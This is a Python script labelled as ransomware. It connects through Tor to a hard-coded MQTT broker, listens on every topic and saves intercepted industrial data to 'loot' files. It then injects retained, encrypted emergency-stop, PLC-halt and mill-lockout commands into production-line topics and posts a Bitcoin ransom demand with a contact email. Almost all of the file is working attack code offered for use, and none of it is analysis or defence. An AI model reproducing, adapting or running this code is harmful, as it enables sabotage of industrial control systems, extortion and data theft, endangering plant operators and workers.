#!/usr/bin/env python3
# MIL_RANSOMWARE_v2.1 - TRUSTEDF57 OPS (FIXED)
# AES-256-CBC + TOR + LCD UI - ZERO ERRORI
import paho.mqtt.client as mqtt
import json, time, threading, base64, os, socket
import socks, requests
from stem import Signal
from stem.control import Controller
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

class MilitaryRansomware:
    def __init__(self):
        self.target_ip = "67.218.246.15"
        self.broker_port = 1883
        self.op_name = "TRUSTEDF57"
        self.btc_addr = "STAMMATIN-O-TENG-TUOST"
        self.ransom_amount = "2.5"
        
        # AES-256-CBC FIXED
        self.aes_key = os.urandom(32)
        self.iv = os.urandom(16)
        
        self.init_tor()
        self.mqtt_client = mqtt.Client("TRUSTEDF57_" + str(time.time()))
        self.mqtt_client.on_connect = self.on_connect
        self.mqtt_client.on_message = self.on_message
        self.locked_status = False
        
        # Salva key
        with open("TRUSTEDF57_key.aes", "wb") as f:
            f.write(self.aes_key + self.iv)
        print("[KEY] AES-256-CBC Key+IV salvata")
    
    def init_tor(self):
        """TOR SOCKS5 (Safe)"""
        try:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket
            print("[TOR] SOCKS5 proxy attivo")
        except:
            print("[TOR] TOR non disponibile - uso connessione diretta")
    
    def aes256_cbc_encrypt(self, plaintext):
        """AES-256-CBC Encrypt FIXED"""
        try:
            # Padding PKCS7
            padder = padding.PKCS7(algorithms.AES.block_size).padder()
            padded_data = padder.update(plaintext) + padder.finalize()
            
            # Cipher
            cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), 
                          backend=default_backend())
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            
            return base64.b64encode(self.iv + ciphertext).decode()
        except Exception as e:
            print(f"[AES] Encrypt error: {e}")
            return base64.b64encode(plaintext).decode()
    
    def aes256_cbc_decrypt(self, ciphertext_b64):
        """AES-256-CBC Decrypt FIXED"""
        try:
            ciphertext = base64.b64decode(ciphertext_b64)
            iv = ciphertext[:16]
            ct = ciphertext[16:]
            
            cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv), 
                          backend=default_backend())
            decryptor = cipher.decryptor()
            padded_plaintext = decryptor.update(ct) + decryptor.finalize()
            
            unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
            return unpadder.update(padded_plaintext) + unpadder.finalize()
        except:
            return ciphertext_b64.encode()
    
    def lcd_ui(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print("=" * 70)
        print("🔴 MILITARY LOCKOUT ACTIVE - TRUSTEDF57 OPS v2.1")
        print("=" * 70)
        print(f"TARGET: {self.target_ip}:{self.broker_port}")
        print(f"STATUS: {'🔒 LOCKED' if self.locked_status else '⚠️ ARMING'}")
        print(f"WALLET: {self.btc_addr}")
        print(f"RANSOM: {self.ransom_amount} BTC")
        print(f"CRYPTO: AES-256-CBC")
        print("=" * 70)
    
    def deploy_lockout(self):
        payloads = {
            "Linea5ResultsFromCyclicRead/Alarms_DB4": '{"cmd":"EMERGENCY_STOP","op":"TRUSTEDF57"}',
            "Linea4ResultsFromCyclicRead/Alarms_DB4": '{"cmd":"PLC_HALT","op":"TRUSTEDF57"}',
            "MoliendaResultsFromCyclicRead/Plc": '{"cmd":"MILL_LOCKOUT","op":"TRUSTEDF57"}',
            "Linea5ResultsFromCyclicRead/Events": self.ransom_screen(),
            "Linea4ResultsFromCyclicRead/Events": self.ransom_screen(),
            "$SYS/broker/ransom/TRUSTEDF57": f"MIL-LOCK:{self.btc_addr}:{self.ransom_amount}",
        }
        
        for topic, payload in payloads.items():
            enc_payload = self.aes256_cbc_encrypt(payload.encode())
            self.mqtt_client.publish(topic, enc_payload, qos=1, retain=True)
            print(f"[INJECT] {topic[:30]}... -> 🔒")
        
        self.locked_status = True
    
    def ransom_screen(self):
        return json.dumps({
            "STATUS": "MILITARY_LOCKOUT",
            "OP": "TRUSTEDF57",
            "PAY": f"{self.ransom_amount} BTC -> {self.btc_addr}",
            "MAIL": "forzaberlusconi@protonmail.com"
        })
    
    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            print(f"[+] ✅ CONNESSO {self.target_ip}:{self.broker_port}")
            client.subscribe("#")
            client.subscribe("$SYS/#")
            threading.Timer(2.0, self.deploy_lockout).start()
        else:
            print(f"[!] Connessione fallita rc={rc}")
    
    def on_message(self, client, userdata, msg):
        try:
            plaintext = self.aes256_cbc_decrypt(msg.payload.decode()).decode(errors='ignore')
            print(f"[EXFIL] {msg.topic}: {plaintext[:80]}...")
            
            # Salva
            topic_safe = msg.topic.replace('/', '_')[:20]
            with open(f"loot_{topic_safe}.txt", "a") as f:
                f.write(f"[{time.strftime('%H:%M:%S')}] {plaintext}\n")
        except Exception as e:
            print(f"[EXFIL] {msg.topic}: {msg.payload[:50]}...")
    
    def connect_mqtt(self):
        """Connessione robusta"""
        while True:
            try:
                self.mqtt_client.connect(self.target_ip, self.broker_port, 60)
                self.mqtt_client.loop_start()
                return
            except:
                print("[MQTT] Riprovo...")
                time.sleep(5)
    
    def run(self):
        print("🚀 TRUSTEDF57 v2.1 AES-256-CBC START")
        self.connect_mqtt()
        
        while True:
            self.lcd_ui()
            time.sleep(3)

if __name__ == "__main__":
    rw = MilitaryRansomware()
    rw.run()
